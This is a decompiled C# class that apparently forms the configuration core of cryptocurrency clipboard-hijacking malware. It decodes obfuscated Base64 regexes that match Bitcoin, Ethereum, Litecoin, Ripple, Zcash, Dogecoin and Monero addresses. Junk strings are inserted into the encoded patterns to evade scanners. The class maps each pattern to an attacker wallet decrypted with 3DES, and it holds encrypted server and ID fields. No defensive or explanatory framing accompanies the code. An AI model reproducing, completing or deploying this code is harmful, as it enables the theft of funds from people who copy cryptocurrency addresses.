using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Omdagerssss
{
	// Token: 0x02000003 RID: 3
	public abstract class Fazathron
	{
		// Token: 0x06000006 RID: 6 RVA: 0x0000207C File Offset: 0x0000027C
		public static string Base64Encode(string plainText)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(plainText);
			return Convert.ToBase64String(bytes);
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000020A0 File Offset: 0x000002A0
		public static string Base64Decode(string base64EncodedData)
		{
			byte[] bytes = Convert.FromBase64String(base64EncodedData);
			return Encoding.UTF8.GetString(bytes);
		}

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x06000008 RID: 8 RVA: 0x000020C4 File Offset: 0x000002C4
		// (set) Token: 0x06000009 RID: 9 RVA: 0x000020CC File Offset: 0x000002CC
		private string _key { get; set; }

		// Token: 0x0600000A RID: 10 RVA: 0x000020D8 File Offset: 0x000002D8
		public void Init(params string[] prms)
		{
			this._key = prms.Last<string>();
			this.list.Add(new j7u7h7h6h6rg
			{
				Pattern = Fazathron.Base64Decode("KF5cK1xkezEsMn0pPygoXChcZHszfVwpKXwoXC0/XGR7M31cLSl8KFxkezN9KSkoKFxkezN9XC1cZHs0fSl@222!~8KFxkezN9XC1cZFxkX@222!~C1cZFxkKXwoXGR7N30pfChcZHszfVwtXGRcL@222!~VxkezN9KSk=".Replace("@222!~", string.Empty))
			});
			this.list.Add(new j7u7h7h6h6rg
			{
				Pattern = Fazathron.Base64Decode("XihbMTNdW2Etaaaaa!a20tekEtSEotTlAtWjEtOV17MjUaaaaa!sMzR9KSQ=".Replace("aaaaa!", string.Empty))
			});
			this.list.Add(new j7u7h7h6h6rg
			{
				Pattern = Fazathron.Base64Decode("XigweFs11111111111wLTlhLWZBLU11111111111ZdezQwfSkk".Replace("11111111111", string.Empty))
			});
			this.list.Add(new j7u7h7h6h6rg
			{
				Pattern = Fazathron.Base64Decode("XihMW2Ete####!!wwkEtWjAtOV17MjY####!!wwsMzN9KSQ=".Replace("####!!ww", string.Empty))
			});
			this.list.Add(new j7u7h7h6h6rg
			{
				Pattern = Fazathron.Base64Decode("XihyW3Jwc2huYWYzyyyy333OXdCVURORUdISktMTTRQUVJTyyyy333VDdWV1hZWjJiY2RlQ2c2NWprbThvRnFpMXR1dkF4eyyyy333XpdezI3LDM1fSkk".Replace("yyyy333", string.Empty))
			});
			this.list.Add(new j7u7h7h6h6rg
			{
				Pattern = Fazathron.Base64Decode("Xih0WzAtOWEtekEtuu343dcWl17MzR9KSQ=".Replace("uu343dc", string.Empty))
			});
			this.list.Add(new j7u7h7h6h6rg
			{
				Pattern = Fazathron.Base64Decode("XihEezF9WzUtOUEtSEoooooooooooooootTlAtVV17MX1bMS05QS1ISi1OUC1aYooooooooooooooS1rbS16XXszMn0pJA==".Replace("oooooooooooooo", string.Empty))
			});
			this.list.Add(new j7u7h7h6h6rg
			{
				Pattern = Fazathron.Base64Decode("Xig0WzAtO@@@@!!s1~UFCXVsxLTl@@@@!!s1~BLVphLXpdezkzLDEwNH0pJA==".Replace("@@@@!!s1~", string.Empty))
			});
			for (int i = 0; i < this.list.Count; i++)
			{
				this.Wallets.Add(i.ToString(), new j7u7h7h6h6rg
				{
					Pattern = this.list[i].Pattern,
					Wallet = this.Decrypt(prms[i])
				});
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000022D8 File Offset: 0x000004D8
		public string Decrypt(string strEncrypted)
		{
			string result;
			try
			{
				result = this.Decrypt(strEncrypted, this._key);
			}
			catch (Exception ex)
			{
				result = "";
			}
			return result;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002314 File Offset: 0x00000514
		public string Decrypt(string strEncrypted, string strKey)
		{
			string result;
			try
			{
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
				byte[] key = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(strKey));
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				byte[] array = Convert.FromBase64String(strEncrypted);
				string @string = Encoding.UTF8.GetString(tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(array, 0, array.Length));
				result = @string;
			}
			catch (Exception ex)
			{
				result = "";
			}
			return result;
		}

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x0600000D RID: 13 RVA: 0x000023A0 File Offset: 0x000005A0
		// (set) Token: 0x0600000E RID: 14 RVA: 0x000023BE File Offset: 0x000005BE
		public string ID
		{
			get
			{
				return this.Decrypt(this._id);
			}
			set
			{
				this._id = value;
			}
		}

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x0600000F RID: 15 RVA: 0x000023C8 File Offset: 0x000005C8
		// (set) Token: 0x06000010 RID: 16 RVA: 0x000023D0 File Offset: 0x000005D0
		public string ApplicationPath { get; set; }

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x06000011 RID: 17 RVA: 0x000023DC File Offset: 0x000005DC
		// (set) Token: 0x06000012 RID: 18 RVA: 0x000023FA File Offset: 0x000005FA
		public string ServerAdress
		{
			get
			{
				return this.Decrypt(this._server);
			}
			set
			{
				this._server = value;
			}
		}

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000013 RID: 19 RVA: 0x00002404 File Offset: 0x00000604
		// (set) Token: 0x06000014 RID: 20 RVA: 0x0000240C File Offset: 0x0000060C
		public string InstallPath { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000015 RID: 21 RVA: 0x00002415 File Offset: 0x00000615
		// (set) Token: 0x06000016 RID: 22 RVA: 0x0000241D File Offset: 0x0000061D
		public Dictionary<string, j7u7h7h6h6rg> Wallets { get; set; } = new Dictionary<string, j7u7h7h6h6rg>();

		// Token: 0x04000004 RID: 4
		private List<j7u7h7h6h6rg> list = new List<j7u7h7h6h6rg>();

		// Token: 0x04000005 RID: 5
		private string _id = string.Empty;

		// Token: 0x04000006 RID: 6
		private string _server = string.Empty;
	}
}
